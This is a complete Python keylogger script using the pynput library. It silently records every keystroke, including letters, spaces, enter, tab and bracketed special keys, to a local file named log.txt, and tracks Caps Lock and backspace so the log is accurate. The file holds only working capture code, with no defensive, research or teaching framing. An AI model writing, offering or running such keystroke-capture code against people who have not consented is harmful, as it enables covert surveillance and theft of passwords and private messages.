from pynput.keyboard import Listener, Key

# Global variable to track Caps Lock state
caps_lock_on = False

def write_to_file(key):
    global caps_lock_on

    try:
        # Handle alphanumeric and symbol keys
        letter = key.char

        # Apply Caps Lock effect
        if letter.isalpha() and caps_lock_on:
            letter = letter.upper()

    except AttributeError:
        # Handle special keys
        if key == Key.space:
            letter = ' '
        elif key == Key.enter:
            letter = '\n'
        elif key == Key.tab:
            letter = '\t'
        elif key == Key.backspace:
            try:
                # Remove last character from the log
                with open("log.txt", 'rb+') as f:
                    f.seek(0, 2)  # Move to the end
                    size = f.tell()
                    if size > 0:
                        f.truncate(size - 1)
            except FileNotFoundError:
                pass
            return
        elif key == Key.caps_lock:
            # Toggle Caps Lock state
            caps_lock_on = not caps_lock_on
            return
        else:
            ignored_keys = {
                Key.shift, Key.shift_l, Key.shift_r,
                Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r,
                Key.cmd, Key.esc
            }
            if key in ignored_keys:
                return
            else:
                # Optional: log unknown special keys
                letter = f'[{str(key).replace("Key.", "")}]'

    # Write character to file
    with open("log.txt", 'a', encoding='utf-8') as f:
        f.write(letter)

# Start the listener
with Listener(on_press=write_to_file) as listener:
    listener.join()
